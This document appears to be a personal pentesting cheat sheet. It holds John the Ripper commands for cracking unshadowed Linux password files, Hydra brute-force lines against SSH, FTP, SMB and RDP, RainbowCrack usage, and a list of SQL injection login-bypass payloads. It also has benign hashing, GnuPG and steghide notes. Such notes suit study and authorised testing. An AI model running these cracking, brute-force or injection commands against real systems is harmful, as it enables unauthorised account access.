===============================random_commands====================================

searchsploit — nmap file.xml — Search vulns inside a Nmap XML result

==================================john=========================================

# combining /etc/passwd and /etc/shadow in a single file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
 
# cracking in single mode
john -single unshadowed.txt
 
# brute-force and dictionary attack
john --wordlist=/usr/share/john/password.lst --rules unshadowed.txt
 
# dictionary files:
# /usr/share/dict  
# /usr/share/metasploit-framework/data/wordlists # -> on Kali Linux
 
# showing cracked hashes  (~/.john/john.pot)
john --show unshadowed.txt 
 
# to continue an interrupted (ctrl+c) session, run  in the same directory:
john -restore
 
# cracking only accounts with specific shells (valid shells) 
john --wordlist=mydict.txt --rules --shell=bash,sh unshadowed.txt
 
# cracking only some accounts
john --wordlist=mydict.txt --rules --users=admin,mark unshadowed.txt
 
# cracking in incremental mode (/etc/john/john.conf)
john --incremental unshadowed.txt

==============================================hydra============================================

HYDRA
 
# installing hydra commad line tool
apt install hydra
 
# installing the GUI
atp install hydra-gtk
 
# launching hydra on SSH daemon (port 22) that runs on 192.168.0.26
# it's trying to brute-force the password of user mark using a wordlist
hydra -l mark -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 10 ssh://192.168.0.26:22
 

hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>


# launching hydra on FTP daemon (port 21) that runs on 192.168.0.26
# it's trying to brute-force the password of user toor using a wordlist
hydra -l toor -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 10 ftp://192.168.0.26:21


================================rainbowtable(rainbowcrack)=====================================

##########################
## Cracking Hashes Using RainbowCrack
##########################
 
# installing rainbowcrack
apt update && apt install rainbowcrack
 
# displaying the help
rtgen
 
# displaying all available charsets
cat /usr/share/rainbowcrack/charset.txt 
 
# performance benchmarking
rtgen sha256 loweralpha 2 6 0 -bench
   5.79 million / s
 
# generating the tables (lower alphanumeric between 1 and 4 chars)
rtgen sha256 loweralpha 1 4 0 2400 100000 0
 
# listing the tables
ls  /usr/share/rainbowcrack/
 
# sorting the tables
rtsort /usr/share/rainbowcrack/
 
# cracking a hash
rcrack /usr/share/rainbowcrack -h 4621c96399f18e867129114496c7a00c1dafce2ead37e0beed4b04c780cd890d


===================================sqli==========================================

admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1—


======================================cryptography======================================

CALCULATING HASHES
 
# calculating hashes using Linux commands
 
md5sum /etc/passwd
a6f07227b6ab47f6486aa3b8ec5a41de  /etc/passwd
 
sha1sum /etc/passwd
d928c9de9f3de0b8ab71eb453093e400bee99b6c  /etc/passwd
 
sha256sum /etc/passwd
e277ddd66709224518de393047a63f048b74dd9b73b1de49a24f5362d41427dd  /etc/passwd
 
sha512sum /etc/passwd
273a39c960f815dbba1f1a4ca198720780ee192fc2dbcd5e6e6ed54122c564879b99ccb73daa62c6c7b49dbb3c97bb8ec1eebf211f668c49f2bbe037b8738eb5  /etc/passwd
 
echo -n "ethical hacking" | sha256sum
285f81a21734ec2f9f667dee22490ec6053e414f9f35efb2170f1b966279916c  -
 
# calculating hashes using openssl 
 
# displaying all supported algorithms
openssl 
OpenSSL> help
 
openssl dgst -sha3-256 /etc/passwd
 
echo -n "linux" | openssl dgst -rmd160
(stdin)= 89939edf840d6edd260dcf326eb71beed79f776d
 
Online tool: https://emn178.github.io/online-tools/sha512.html


GnuPG
-----
 
# 1. Installation
Windows: https://gpg4win.org/download.html
Linux: apt install gnupg
MacOs: brew install gnupg
 
# 2. getting help
gpg --help
 
# 3. Symmetric encryption
gpg -c secret.txt  # -> results secret.txt.gpg (binary file)
 
# specifying an alternative algorithm and an output file (my_secret.txt.gpg)
gpg -c --cipher-algo blowfish -o my_secret.txt.gpg secret.txt
 
# creating a text (ascii) encrypted file
gpg --armor -c secret.txt  # -> results secret.txt.asc (ascii file) 
 
# 4. Symmetric decryption
gpg -o secret.txt -d file.txt.gpg # -> secret.txt is the resulting file in clear-text
 
# 5. Key management
# generating a key pair
gpg --gen-key
 
# displaying the public keys stored in the keyring
gpg --list-keys
 
# displaying the secret keys stored in the keyring
gpg --list-secret-keys
gpg --list-secret-keys --keyid-format short
gpg --list-secret-keys --keyid-format long
 
# exporting a private key by id into a text format
gpg --export-secret-keys --armor B211B48E > private_key.asc 
 
# exporting a public key by id into a text format
gpg --export --armor B211B48E > public_key.pub
 
# deleting a secret key by id
gpg --delete-secret-keys B211B48E
 
# deleting a public key by id
gpg --delete-keys B211B48E
 
# importing a private or public key from a text file
gpg --import private.asc 
gpg --import public.pub 
 
# importing a public key from a key server
gpg --keyserver pgp.mit.edu  --recv 8483C65D
 
# publishing a public key on a key server
gpg --keyserver hkp://pgp.mit.edu --send-keys 30E6A0BE
 
# searching for a key on a key server
gpg --keyserver pgp.mit.edu --search-keys string_to_match
gpg --keyserver pgp.mit.edu --search-keys name@email.com
 
 
# 6. Asymmetric (Public Key) encryption
# encrypting a file asymmetrically using the public key id 95FC2D9E80DB23C0 (should have it in the keyring) 
gpg --encrypt --recipient 95FC2D9E80DB23C0 message.txt # -> results a binary file
gpg --encrypt --recipient 95FC2D9E80DB23C0 --armor message.txt # -> results an ascii file
 
# decrypting the file (should have the private key)
gpg --decrypt -o file.txt message.txt.asc
 
 
#7. Digital Signing
# generating a clear-text ascii file that contains both the content and the signature at the end (file.txt.asc).
gpg --clearsign file.txt
 
# generating a clear-text binary file that contains both the content and the signature at the end (file.txt.gpg).
gpg --sign file.txt
 
# generating a binary detached-signature
gpg --detach-sig --output message.txt.sig message.txt
 
# generating an ascii detached signature
gpg  --detach-sig --armor --output message.sig.asc message.txt
 
# To check a signature you need: a) the file to check b) the signature c) the public key of the one that signed
 
# checking a signature
gpg --verify message.txt.asc
 
# checking a signature and extracting the document without the signature
gpg --decrypt message.txt.asc
gpg --output file.txt --decrypt message.txt.asc
 
# checking a detached signature
gpg --verify message.sig.asc message.txt
 
# encrypting (asymmetrically) and signing a file
gpg --encrypt --recipient PUBLIC_KEY_ID --sign message.txt


====================Steghide==========================
steghide embed -ef secret.txt -cf cat.jpg 
Enter passphrase: 
Re-Enter passphrase: 
embedding "secret.txt" in "cat.jpg"... done
 
# getting info about a cover/stego file
steghide info cat.jpg 
"cat.jpg":
  format: jpeg
  capacity: 47.5 KB
Try to get information about embedded data ? (y/n) n
 
# extracting the secret file from the stego file
steghide extract -sf cat.jpg 
Enter passphrase: 
wrote extracted data to "secret.txt".



Android hacking
=================

ADB
Nox player

fping

=======================================================================================
.zsrc =update a alias name to a path to access it without placing the full path
nbtstat -A 192.168.0.1 : from windows

NET VIEW 192.168.0.1

True master of tools
----------------------
Every untouched tools, github collection of tools and mastery


Traditional deeper of CTF
-------------------------
binary exploitation ,cryptography and forensic

zen specific of certification
-----------------------------
Everything about OSCP

Nobel Laurette of C2
---------------------------
GO phish, SET, campaigning, Empire


Killer Expert of android
------------------------
Android Hacking 101 with studio, adb and more

